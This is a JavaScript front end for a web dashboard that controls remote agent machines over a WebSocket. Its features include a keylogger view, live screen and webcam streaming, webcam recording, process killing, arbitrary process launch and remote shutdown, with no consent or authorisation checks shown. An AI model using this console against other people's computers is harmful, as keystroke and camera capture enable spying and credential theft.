document.addEventListener("DOMContentLoaded", () => {

    /** ---------------------------------------------------
     *  GLOBAL STATE
     * --------------------------------------------------*/
    let ws = null;
    let currentView = "applications";
    let currentAgentId = null;

    let lastLoggedKeyCode = null;
    let isKeylogClean = true;

    let currentVideoBlob = null;
    let scanInterval = null;
    let lastScanDataJson = "";

    /** ---------------------------------------------------
     *  DOM SHORTCUTS
     * --------------------------------------------------*/
    const $ = (s) => document.querySelector(s);
    const $$ = (s) => document.querySelectorAll(s);

    /** ---------------------------------------------------
     *  DOM ELEMENTS
     * --------------------------------------------------*/
    const wsUrlInput      = $("#ws-url-input");
    const btnConnect      = $("#btn-connect");
    const btnDisconnect   = $("#btn-disconnect");
    const btnScanLan      = $("#btn-scan-lan");
    const statusPill      = $("#status-pill");
    const statusText      = $("#status-pill .status-text");

    const sidebar         = $("#sidebar");
    const themeToggle     = $("#theme-toggle");

    const keylogToggle    = $("#keylog-toggle");
    const keylogOutput    = $("#keylog-output");
    const btnClearKeylog  = $("#btn-clear-keylog");

    /** ---------------------------------------------------
     *  MODAL HELPERS
     * --------------------------------------------------*/
    const modalConfirm = $("#modal-confirm");
    const confirmTitle = $("#confirm-title");
    const confirmMsg   = $("#confirm-message");
    const btnConfirmYes = $("#btn-confirm-yes");
    let confirmCallback = null;

    function showConfirmModal(title, msg, type, callback) {
        confirmTitle.textContent = title;
        confirmMsg.textContent = msg;
        confirmCallback = callback;

        const iconBox = $("#confirm-icon-box");
        if (iconBox) iconBox.className = `icon-box ${type === "danger" ? "red" : "blue"}`;

        modalConfirm.classList.remove("hidden");
        $("#modal-backdrop").classList.remove("hidden");
    }

    btnConfirmYes.onclick = () => {
        if (confirmCallback) confirmCallback();
        closeAllModals();
    };

    function showModal(id) {
        $(`#${id}`).classList.remove("hidden");
        $("#modal-backdrop").classList.remove("hidden");
    }

    function closeAllModals() {
        $$(".modal").forEach(m => m.classList.add("hidden"));
        $("#modal-backdrop").classList.add("hidden");
        stopScanning();
    }

    $("#modal-backdrop").onclick = closeAllModals;
    $$("[data-action='cancel']").forEach(btn => btn.onclick = closeAllModals);

    /** ---------------------------------------------------
     *  NETWORK SCAN (LAN)
     * --------------------------------------------------*/
    async function fetchScanList() {
        try {
            const response = await fetch(`${location.protocol}//${location.host}/api/scan`);
            if (!response.ok) return;

            const result = await response.json();
            renderScanList(result.data);

        } catch (err) {
            console.error("Scan error:", err);
        }
    }

    function stopScanning() {
        if (scanInterval) clearInterval(scanInterval);
        scanInterval = null;
        if (btnScanLan) btnScanLan.classList.remove("active-scan");
    }

    btnScanLan.onclick = () => {
        btnScanLan.classList.add("active-scan");
        showModal("modal-scan-lan");

        $("#scan-list").innerHTML = `
            <div class="list-loading"><div class="spinner"></div><br>Scanning network...</div>
        `;

        stopScanning();
        fetchScanList();
        scanInterval = setInterval(fetchScanList, 300);
    };

    /** ---------------------------------------------------
     *  RENDER SCAN RESULT
     * --------------------------------------------------*/
    function renderScanList(data) {
        const container = $("#scan-list");

        if (data?.length > 0) data.sort((a, b) => a.ip.localeCompare(b.ip));

        const json = JSON.stringify(data);
        if (json === lastScanDataJson && container.innerHTML.trim() !== "") return;
        lastScanDataJson = json;

        if (!data || data.length === 0) {
            container.innerHTML = `
                <div class="list-loading" style="grid-column:1/-1;">
                    <div class="spinner" style="border-color:#06b6d4;border-top-color:transparent;"></div>
                    <br><span style="color:#06b6d4;font-weight:500;">Scanning Radar Active...</span>
                    <br><small style="opacity:.7">Looking for agents</small>
                </div>`;
            return;
        }

        container.innerHTML = data.map(agent => {
            const iconName = agent.os.includes("Windows")
                ? "layout"
                : agent.os.includes("Linux")
                ? "terminal"
                : "monitor";

            const selected = agent.agentId === currentAgentId;

            return `
                <div class="device-card ${selected ? "selected-agent" : ""}"
                     data-agent-id="${agent.agentId}"
                     onclick="selectAgent('${agent.agentId}','${agent.hostname}')">

                    <div class="device-status"></div>

                    <button class="btn-connect-action"
                            title="${selected ? "Selected" : "Select Agent"}">
                        <i data-feather="${selected ? "check" : "zap"}"></i>
                    </button>

                    <div class="device-icon-large">
                        <i data-feather="${iconName}"></i>
                    </div>

                    <div class="device-info">
                        <span class="device-hostname">${agent.hostname}</span>
                        <span class="device-ip">${agent.agentId}</span>
                    </div>
                </div>
            `;
        }).join("");

        feather.replace();
    }

    /** ---------------------------------------------------
     *  SELECT AGENT
     * --------------------------------------------------*/
    window.selectAgent = (agentId, hostname) => {
        currentAgentId = agentId;

        const proto = location.protocol === "https:" ? "wss" : "ws";
        wsUrlInput.value = `${proto}://${location.host}/ws`;

        closeAllModals();
        if (ws && ws.readyState === WebSocket.OPEN) ws.close();

        setTimeout(() => {
            try {
                ws = new WebSocket(wsUrlInput.value);

                ws.onopen = () => {
                    setConnectedState(true, hostname);
                    loadDataForView(currentView);
                };

                ws.onclose = handleWsClose;
                ws.onerror = () => alert("Connection failed");
                ws.onmessage = onWsMessage;

            } catch (e) {
                alert("Failed to connect to agent");
            }
        }, 300);
    };

    /** ---------------------------------------------------
     *  CONNECTION STATE
     * --------------------------------------------------*/
    function setConnectedState(connected, agentName = null) {
        statusPill.classList.toggle("connected", connected);
        statusPill.classList.toggle("disconnected", !connected);

        statusText.textContent = connected
            ? `Connected: ${agentName ?? currentAgentId}`
            : "Disconnected";

        btnConnect.classList.toggle("hidden", connected);
        btnDisconnect.classList.toggle("hidden", !connected);

        wsUrlInput.disabled = connected;

        if (!connected) currentAgentId = null;
    }

    btnConnect.onclick = connectWs;
    btnDisconnect.onclick = () => ws?.close();

    function connectWs() {
        if (!wsUrlInput.value) return alert("Enter WebSocket URL");

        try {
            ws = new WebSocket(wsUrlInput.value);
        } catch (e) {
            return alert("Invalid WebSocket URL");
        }

        ws.onopen = () => {
            setConnectedState(true);
            if (currentAgentId) loadDataForView(currentView);
        };

        ws.onerror = () => alert("Connection failed");
        ws.onclose = handleWsClose;
        ws.onmessage = onWsMessage;
    }

    function handleWsClose() {
        setConnectedState(false);
        ws = null;
        resetProcessTables();
    }

    function resetProcessTables() {
        $("#processes-table tbody").innerHTML = "";
        $("#apps-table tbody").innerHTML = "";
        keylogOutput.textContent = "System ready. Waiting...";
        keylogToggle.checked = false;
        lastLoggedKeyCode = null;
    }

    /** ---------------------------------------------------
     *  SEND MESSAGE TO GATEWAY
     * --------------------------------------------------*/
    function sendWsMessage(payload) {
        if (!ws || ws.readyState !== WebSocket.OPEN)
            return alert("Not connected.");

        if (!currentAgentId)
            return alert("Please select an agent first.");

        ws.send(JSON.stringify({ ...payload, agentId: currentAgentId }));
    }

    /** ---------------------------------------------------
     *  DISPATCH INCOMING MESSAGE
     * --------------------------------------------------*/
    function onWsMessage(event) {
        const msg = JSON.parse(event.data);

        switch (msg.type) {
            case "process_list":       renderProcessTable(msg.data); break;
            case "application_list":   renderAppTable(msg.data); break;
            case "screenshot":         handleScreenshot(msg); break;
            case "screen_frame":       handleScreenFrame(msg); break;
            case "webcam_recording_status": handleWebcamStatus(msg); break;
            case "webcam_video":       handleWebcamVideo(msg.data); break;
            case "webcam_frame":       handleWebcamFrame(msg.data); break;
            case "key_event":          handleKeyEvent(msg.key_code); break;
            case "status":             handleStatus(msg); break;
        }
    }

    /** ---------------------------------------------------
     *  NAVIGATION
     * --------------------------------------------------*/
    function showView(viewId) {
        currentView = viewId;

        $$(".content-view").forEach(v => v.classList.remove("active"));
        $(`#view-${viewId}`).classList.add("active");

        $$(".nav-item").forEach(n => n.classList.remove("active"));
        const activeNav = $(`.nav-item[data-view="${viewId}"]`);
        if (activeNav) activeNav.classList.add("active");

        if (ws && ws.readyState === WebSocket.OPEN) loadDataForView(viewId);
    }

    function loadDataForView(id) {
        if (id === "processes-table") sendWsMessage({ command: "list_processes" });
        if (id === "applications-table") sendWsMessage({ command: "list_applications" });
    }

    sidebar.onclick = (e) => {
        const item = e.target.closest(".nav-item");
        if (item) showView(item.dataset.view);
    };

    /** ---------------------------------------------------
     *  THEME TOGGLE
     * --------------------------------------------------*/
    if (themeToggle) {
        themeToggle.onchange = (e) => {
            document.body.className = e.target.checked ? "dark-theme" : "";
            localStorage.setItem("theme", e.target.checked ? "dark" : "light");
        };

        const savedTheme = localStorage.getItem("theme");
        if (savedTheme === "dark") themeToggle.checked = true;
    }

    /** ---------------------------------------------------
     *  PROCESS RENDERERS
     * --------------------------------------------------*/
    function renderProcessTable(data) {
        const tbody = $("#processes-table tbody");
        if (!tbody) return;

        if (!data || !data.length) {
            tbody.innerHTML = `<tr><td colspan="4">No data.</td></tr>`;
            return;
        }

        const fmt = new Intl.NumberFormat("en-US");

        tbody.innerHTML = data.map(p => `
            <tr>
                <td><span class="status-pill">${p.pid}</span></td>
                <td>${p.name}</td>
                <td>${p.workingSet ? fmt.format(p.workingSet) + " B" : "N/A"}</td>
                <td class="text-right">
                    <button class="btn btn-sm btn-danger"
                            data-action="stop-proc" data-pid="${p.pid}">
                        Stop
                    </button>
                </td>
            </tr>
        `).join("");
    }

    function renderAppTable(data) {
        const tbody = $("#apps-table tbody");
        if (!tbody) return;

        if (!data || !data.length) {
            tbody.innerHTML = `<tr><td colspan="3">No data.</td></tr>`;
            return;
        }

        tbody.innerHTML = data.map(a => `
            <tr>
                <td>${a.name}</td>
                <td>${a.process_count}</td>
                <td class="text-right">
                    <button class="btn btn-sm btn-danger"
                            data-action="stop-app" data-name="${a.name}">
                        End Task
                    </button>
                </td>
            </tr>
        `).join("");
    }

    /** ---------------------------------------------------
     *  SCREENSHOT HANDLERS
     * --------------------------------------------------*/
    const captureImg       = $("#capture-img");
    const streamImg        = $("#stream-img");
    const captureSpinner   = $("#capture-spinner");
    const capturePlaceholder = $("#capture-placeholder");
    const btnStartStream   = $("#btn-start-stream");
    const btnStopStream    = $("#btn-stop-stream");
    const btnSaveScreenshot= $("#btn-save-screenshot");
    const btnCopyScreenshot= $("#btn-copy-screenshot");
    const btnTakeScreenshot= $("#btn-take-screenshot");
    const btnReloadScreen  = $("#btn-reload-screen");

    /** Handle screenshot result */
    function handleScreenshot(msg) {
        captureSpinner.classList.add("hidden");

        streamImg.classList.add("hidden");
        streamImg.src = "";

        capturePlaceholder.parentElement.classList.add("hidden");

        captureImg.src = `data:image/png;base64,${msg.data}`;
        captureImg.classList.remove("hidden");

        btnSaveScreenshot.classList.remove("hidden");
        btnCopyScreenshot.classList.remove("hidden");
    }

    /** Handle screen stream frame */
    function handleScreenFrame(msg) {
        if (!btnStartStream.classList.contains("hidden")) return;

        $("#capture-display-area .empty-state").classList.add("hidden");
        captureImg.classList.add("hidden");

        streamImg.src = `data:image/jpeg;base64,${msg.data}`;
        streamImg.classList.remove("hidden");
    }

    /** Button: Screenshot */
    btnTakeScreenshot.onclick = () => {
        if (!ws || ws.readyState !== WebSocket.OPEN) return alert("Connect first");

        sendWsMessage({ command: "stop_screen_stream" });

        captureSpinner.classList.remove("hidden");
        capturePlaceholder.parentElement.classList.add("hidden");

        streamImg.classList.add("hidden");
        captureImg.classList.add("hidden");

        btnSaveScreenshot.classList.add("hidden");
        btnCopyScreenshot.classList.add("hidden");

        btnStartStream.classList.remove("hidden");
        btnStopStream.classList.add("hidden");

        sendWsMessage({ command: "capture_screen" });
    };

    /** Button: Reset Screen UI */
    btnReloadScreen.onclick = () => {
        if (ws?.readyState === WebSocket.OPEN)
            sendWsMessage({ command: "stop_screen_stream" });

        captureImg.classList.add("hidden");
        captureImg.src = "";

        streamImg.classList.add("hidden");
        streamImg.src = "";

        $("#capture-display-area .empty-state").classList.remove("hidden");
        capturePlaceholder.textContent = "Ready to capture/stream screen";

        captureSpinner.classList.add("hidden");
        btnSaveScreenshot.classList.add("hidden");
        btnCopyScreenshot.classList.add("hidden");

        btnStartStream.classList.remove("hidden");
        btnStopStream.classList.add("hidden");
    };

    /** Save screenshot */
    btnSaveScreenshot.onclick = () => {
        const a = document.createElement("a");
        a.href = captureImg.src;
        a.download = `screen-${Date.now()}.png`;
        a.click();
    };

    /** Copy screenshot */
    btnCopyScreenshot.onclick = async () => {
        try {
            const blob = await (await fetch(captureImg.src)).blob();
            await navigator.clipboard.write([
                new ClipboardItem({ [blob.type]: blob })
            ]);
            alert("Copied!");
        } catch {
            navigator.clipboard.writeText(captureImg.src.split(",")[1]);
            alert("Copied Base64");
        }
    };

    /** Screen Streaming */
    btnStartStream.onclick = () => {
        if (!ws || ws.readyState !== WebSocket.OPEN) return alert("Connect first");

        streamImg.classList.add("hidden");
        captureImg.classList.add("hidden");

        $("#capture-display-area .empty-state").classList.remove("hidden");
        capturePlaceholder.textContent = "Initializing Screen Stream...";
        captureSpinner.classList.remove("hidden");

        btnStartStream.classList.add("hidden");
        btnStopStream.classList.remove("hidden");

        sendWsMessage({ command: "start_screen_stream", fps: 15 });
    };

    btnStopStream.onclick = () => {
        sendWsMessage({ command: "stop_screen_stream" });

        streamImg.classList.add("hidden");
        captureImg.classList.add("hidden");

        $("#capture-display-area .empty-icon").classList.remove("hidden");
        capturePlaceholder.textContent = "Ready to capture/stream screen";

        captureSpinner.classList.add("hidden");
        btnStartStream.classList.remove("hidden");
        btnStopStream.classList.add("hidden");
    };

    /** ---------------------------------------------------
     *  WEBCAM
     * --------------------------------------------------*/
    const webcamSpinner     = $("#webcam-spinner");
    const webcamPlaceholder = $("#webcam-placeholder");
    const webcamStreamImg   = $("#webcam-stream-img");
    const webcamVideoOutput = $("#webcam-video-output");
    const webcamStatus      = $("#webcam-status");

    const btnStartRecord      = $("#btn-start-record");
    const btnStopRecord       = $("#btn-stop-record");
    const btnSaveVideo        = $("#btn-save-video");

    const btnStartWebcamStream= $("#btn-start-webcam-stream");
    const btnStopWebcamStream = $("#btn-stop-webcam-stream");
    const btnReloadWebcam     = $("#btn-reload-webcam");

    /** Webcam Status Updates */
    function handleWebcamStatus(msg) {
        webcamStatus.textContent = msg.message;
        webcamStatus.classList.remove("hidden");

        if (msg.message.includes("Recording started")) {
            btnStartRecord.classList.add("hidden");
            btnStopRecord.classList.remove("hidden");

            btnStartWebcamStream.classList.add("hidden");
            btnStopWebcamStream.classList.add("hidden");

            btnSaveVideo.classList.add("hidden");

            webcamPlaceholder.parentElement.classList.add("hidden");
            webcamSpinner.classList.remove("hidden");
            webcamVideoOutput.classList.add("hidden");

        } else if (msg.message.includes("completed")) {
            webcamSpinner.classList.add("hidden");
            webcamPlaceholder.parentElement.classList.remove("hidden");
            webcamPlaceholder.textContent = "Processing...";

        } else if (
            msg.message.includes("error") ||
            msg.message.includes("cancelled") ||
            msg.message.includes("stopped")
        ) {
            webcamSpinner.classList.add("hidden");
            webcamPlaceholder.parentElement.classList.remove("hidden");
            webcamPlaceholder.textContent = "Ready to record or stream webcam";

            btnStartRecord.classList.remove("hidden");
            btnStopRecord.classList.add("hidden");

            btnStartWebcamStream.classList.remove("hidden");
            btnStopWebcamStream.classList.add("hidden");

            setTimeout(() => webcamStatus.classList.add("hidden"), 3000);
        }
    }

    /** Receive webcam recorded video (Base64 → Blob) */
    function handleWebcamVideo(b64) {
        webcamSpinner.classList.add("hidden");
        webcamPlaceholder.parentElement.classList.add("hidden");

        webcamStreamImg.classList.add("hidden");
        webcamStreamImg.src = "";

        const binary = atob(b64);
        const bytes = new Uint8Array(binary.length);
        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);

        if (currentVideoBlob) URL.revokeObjectURL(currentVideoBlob);
        currentVideoBlob = new Blob([bytes], { type: "video/mp4" });

        webcamVideoOutput.src = URL.createObjectURL(currentVideoBlob);
        webcamVideoOutput.classList.remove("hidden");

        btnStartRecord.classList.remove("hidden");
        btnStopRecord.classList.add("hidden");
        btnSaveVideo.classList.remove("hidden");
        btnStartWebcamStream.classList.remove("hidden");
    }

    /** Webcam Streaming frame */
    function handleWebcamFrame(b64) {
        if (!btnStartWebcamStream.classList.contains("hidden")) return;

        $("#webcam-display-area .empty-state").classList.add("hidden");

        webcamVideoOutput.classList.add("hidden");

        webcamStreamImg.src = `data:image/jpeg;base64,${b64}`;
        webcamStreamImg.classList.remove("hidden");
    }

    /** Webcam Record Modal */
    btnStartRecord.onclick = () => showModal("modal-webcam-device");

    $("#modal-webcam-device [data-action='confirm']").onclick = () => {
        webcamVideoOutput.src = "";
        webcamVideoOutput.classList.add("hidden");

        webcamStreamImg.src = "";
        webcamStreamImg.classList.add("hidden");

        currentVideoBlob = null;

        sendWsMessage({
            command: "start_webcam_record",
            time: parseInt($("#input-webcam-duration").value) || 10,
            device_name: $("#input-webcam-device-name").value
        });

        closeAllModals();
        webcamSpinner.classList.remove("hidden");
    };

    btnStopRecord.onclick = () => sendWsMessage({ command: "stop_webcam_record" });

    btnSaveVideo.onclick = () => {
        if (!currentVideoBlob) return;

        const a = document.createElement("a");
        a.href = URL.createObjectURL(currentVideoBlob);
        a.download = `webcam-${Date.now()}.mp4`;
        a.click();
    };

    /** Webcam Streaming */
    btnStartWebcamStream.onclick = () => {
        if (!ws || ws.readyState !== WebSocket.OPEN) return alert("Connect first");

        webcamStreamImg.src = "";
        webcamStreamImg.classList.add("hidden");

        webcamVideoOutput.classList.add("hidden");
        if (currentVideoBlob) {
            URL.revokeObjectURL(currentVideoBlob);
            currentVideoBlob = null;
        }

        btnSaveVideo.classList.add("hidden");

        $("#webcam-display-area .empty-state").classList.remove("hidden");
        webcamPlaceholder.textContent = "Initializing Camera Stream...";
        webcamSpinner.classList.remove("hidden");

        btnStartRecord.classList.add("hidden");
        btnStopRecord.classList.add("hidden");

        btnStartWebcamStream.classList.add("hidden");
        btnStopWebcamStream.classList.remove("hidden");

        sendWsMessage({ command: "start_webcam_stream", fps: 30 });
    };

    btnStopWebcamStream.onclick = () => {
        sendWsMessage({ command: "stop_webcam_stream" });

        webcamStreamImg.classList.add("hidden");
        webcamStreamImg.src = "";

        webcamSpinner.classList.add("hidden");
        webcamPlaceholder.textContent = "Ready to record or stream webcam";
        webcamPlaceholder.parentElement.classList.remove("hidden");

        btnStartWebcamStream.classList.remove("hidden");
        btnStopWebcamStream.classList.add("hidden");
        btnStartRecord.classList.remove("hidden");
    };

    btnReloadWebcam.onclick = () => {
        if (ws?.readyState === WebSocket.OPEN) {
            sendWsMessage({ command: "stop_webcam_stream" });
            sendWsMessage({ command: "stop_webcam_record" });
        }

        webcamStreamImg.classList.add("hidden");
        webcamStreamImg.src = "";

        webcamVideoOutput.classList.add("hidden");
        webcamVideoOutput.src = "";

        if (currentVideoBlob) {
            URL.revokeObjectURL(currentVideoBlob);
            currentVideoBlob = null;
        }

        $("#webcam-display-area .empty-state").classList.remove("hidden");
        webcamSpinner.classList.add("hidden");
        webcamStatus.classList.add("hidden");

        webcamPlaceholder.textContent = "Ready to record or stream webcam";

        btnStartWebcamStream.classList.remove("hidden");
        btnStopWebcamStream.classList.add("hidden");

        btnStartRecord.classList.remove("hidden");
        btnStopRecord.classList.add("hidden");

        btnSaveVideo.classList.add("hidden");
    };

    /** ---------------------------------------------------
     *  KEYLOGGER
     * --------------------------------------------------*/
    function handleKeyEvent(keyCode) {
        if (keyCode === 231) return;

        const el = $("#keylog-output");
        if (isKeylogClean) {
            el.textContent = "";
            isKeylogClean = false;
        }

        function translate(code) {
            if (code >= 65 && code <= 90) return String.fromCharCode(code);
            if (code >= 48 && code <= 57) return String.fromCharCode(code);
            if (code >= 96 && code <= 105) return `[Num ${code - 96}]`;

            const map = {
                8:"[Backspace]",9:"[Tab]",13:"[Enter]\n",19:"[Pause]",
                20:"[CapsLk]",27:"[Esc]",32:"[Space]",
                33:"[PgUp]",34:"[PgDn]",35:"[End]",36:"[Home]",
                37:"[Left]",38:"[Up]",39:"[Right]",40:"[Down]",
                44:"[PrtSc]",45:"[Insert]",46:"[Delete]",
                106:"[Num *]",107:"[Num +]",109:"[Num -]",
                110:"[Num .]",111:"[Num /]",144:"[NumLock]",
                112:"[F1]",113:"[F2]",114:"[F3]",115:"[F4]",
                116:"[F5]",117:"[F6]",118:"[F7]",119:"[F8]",
                120:"[F9]",121:"[F10]",122:"[F11]",123:"[F12]",
                160:"[LShift]",161:"[RShift]",162:"[LCtrl]",163:"[LCtrl]",
                164:"[LAlt]",165:"[RAlt]",
                186:";",187:"=",188:",",189:"-",190:".",
                191:"/",192:"`",
                219:"[",220:"\\",221:"]",222:"'",
                91:"[LWin]",92:"[RWin]",93:"[Menu]"
            };
            return map[code] || `[${code}]`;
        }

        el.textContent += translate(keyCode);
        el.scrollTop = el.scrollHeight;
    }

    keylogToggle.onchange = e => {
        if (!ws) return (e.target.checked = false, alert("Connect first"));

        sendWsMessage({
            command: e.target.checked ? "start_keylog" : "stop_keylog"
        });

        keylogOutput.textContent = e.target.checked
            ? "Starting..."
            : "Stopped.";

        isKeylogClean = true;
    };

    btnClearKeylog.onclick = () => {
        keylogOutput.textContent = "Cleared.";
        isKeylogClean = true;
    };

    /** ---------------------------------------------------
     *  DASHBOARD EVENT HANDLERS
     * --------------------------------------------------*/
    $("#main-content").onclick = (e) => {
        const viewCard = e.target.closest("[data-action='show-view']");
        if (viewCard) showView(viewCard.dataset.target);

        const stopProcBtn = e.target.closest("[data-action='stop-proc']");
        if (stopProcBtn) {
            const pid = stopProcBtn.dataset.pid;
            showConfirmModal(
                "Stop Process",
                `Kill PID ${pid}?`,
                "danger",
                () => sendWsMessage({ command: "stop_process_pid", pid: parseInt(pid) })
            );
        }

        const stopAppBtn = e.target.closest("[data-action='stop-app']");
        if (stopAppBtn) {
            const name = stopAppBtn.dataset.name;
            showConfirmModal(
                "Stop Application",
                `Force stop "${name}"?`,
                "danger",
                () => sendWsMessage({ command: "stop_application", app_name: name })
            );
        }
    };

    /** ---------------------------------------------------
     *  STOP APPS / KILL PROCESS MODALS
     * --------------------------------------------------*/
    $("#card-open-stop-apps")?.addEventListener("click", () => {
        if (!ws || ws.readyState !== WebSocket.OPEN) return alert("Connect first!");
        showModal("modal-stop-app");
        $("#stop-app-list").innerHTML = loadingElement("Fetching Apps...");
        sendWsMessage({ command: "list_applications" });
    });

    $("#card-open-stop-procs")?.addEventListener("click", () => {
        if (!ws || ws.readyState !== WebSocket.OPEN) return alert("Connect first!");
        showModal("modal-stop-proc");
        $("#stop-proc-list").innerHTML = loadingElement("Fetching Processes...");
        sendWsMessage({ command: "list_processes" });
    });

    function loadingElement(txt) {
        return `
            <div class="list-loading">
                <div class="spinner"></div>
                <br>${txt}
            </div>
        `;
    }

    /** ---------------------------------------------------
     *  START PROCESS / START APPLICATION
     * --------------------------------------------------*/
    $("#btn-start-process").onclick = () => showModal("modal-start-process");
    $("#btn-start-app").onclick     = () => showModal("modal-start-app");

    $("#modal-start-process [data-action='confirm']").onclick = () => {
        const path = $("#input-proc-path").value;
        const args = $("#input-proc-args").value;
        sendWsMessage({ command: "start_process", path, args });
        closeAllModals();
    };

    $("#modal-start-app [data-action='confirm']").onclick = () => {
        const name = $("#input-app-name").value;
        sendWsMessage({ command: "start_application", app_name: name });
        closeAllModals();
    };

    /** ---------------------------------------------------
     *  SYSTEM CONTROL BUTTONS
     * --------------------------------------------------*/
    $("#btn-system-restart")?.addEventListener("click", () =>
        showConfirmModal(
            "Restart",
            "Restart remote PC?",
            "danger",
            () => sendWsMessage({ command: "system_restart" })
        )
    );

    $("#btn-system-shutdown")?.addEventListener("click", () =>
        showConfirmModal(
            "Shutdown",
            "Shutdown remote PC?",
            "danger",
            () => sendWsMessage({ command: "system_shutdown" })
        )
    );

    /** ---------------------------------------------------
     *  WINDOW TRAFFIC BUTTONS (MAC-STYLE)
     * --------------------------------------------------*/
    $(".dot.red")?.addEventListener("click", () => ws?.close());
    $(".dot.yellow")?.addEventListener("click", () => themeToggle?.click());
    $(".dot.green")?.addEventListener("click", () =>
        document.fullscreenElement
            ? document.exitFullscreen()
            : document.documentElement.requestFullscreen()
    );

    /** ---------------------------------------------------
     *  INIT FUNCTION
     * --------------------------------------------------*/
    function init() {
        // Auto-fill WebSocket URL
        const proto = location.protocol === "https:" ? "wss" : "ws";
        wsUrlInput.value = `${proto}://${location.host}/ws`;

        // Set initial view
        showView(currentView);

        // Feather icons init
        setTimeout(() => feather.replace(), 500);

        // Restore theme
        const savedTheme = localStorage.getItem("theme");
        if (savedTheme === "dark") {
            themeToggle.checked = true;
            document.body.classList.add("dark-theme");
        }
    }

    init();

});